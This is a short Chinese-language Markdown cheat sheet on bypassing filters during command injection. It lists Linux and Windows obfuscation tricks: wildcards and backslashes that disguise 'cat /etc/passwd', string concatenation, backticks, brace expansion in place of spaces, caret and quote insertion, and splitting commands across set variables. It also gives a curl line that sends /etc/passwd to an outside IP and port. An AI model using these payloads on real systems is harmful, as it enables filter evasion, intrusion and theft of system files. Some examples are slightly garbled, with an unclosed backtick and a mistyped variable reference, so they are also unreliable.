- [命令注入](#命令注入)
  - [Bypass](#bypass)
    - [Linux](#linux)
    - [通配符](#通配符)
    - [字符串拼接](#字符串拼接)
    - [\\ (回车)](#-回车)
    - [curl -d](#curl--d)
    - [反引号](#反引号)
    - [大括号](#大括号)
    - [Windows](#windows)
    - [特殊符号](#特殊符号)
    - [set变量](#set变量)
    - [切割字符串](#切割字符串)

# 命令注入
## Bypass
### Linux
区别大小写
### 通配符
`/???/c?t /?t?/p??swd` -> `cat /etc/passwd`
### 字符串拼接
1. python,java: + 
2. php, perl: .
3. 
```
a=who
b=ami
ab
```
### \ (回车)
1. `c\a\t /etc/passwd`
2. `c\ 回车 at /etc/passwd
### curl -d
curl -d 参数能够读取本地文件  
`curl -d @/etc/passwd x.x.x.x:8080`
### 反引号
```
``内的字符会被当成命令执行
```
### 大括号
{}代替空格  
`{ls,-alt}`
### Windows
不区分大小写
### 特殊符号
这些符号不会影响命令执行,
1. "
2. ^ 
3. ()
```
whoami //正常执行
w"h"o"a"m"i //正常执行
w"h"o"a"m"i" //正常执行
wh"“oami //正常执行
wh”“o^am"i //正常执行
((((Whoam”"i)))) //正常执行
```
### set变量
%%之间的变量会引用其值
```
set a=who
set b=ami
%a%%b%
```
### 切割字符串
截取字符串:
%a:~0,6%,取变量a的0到6的值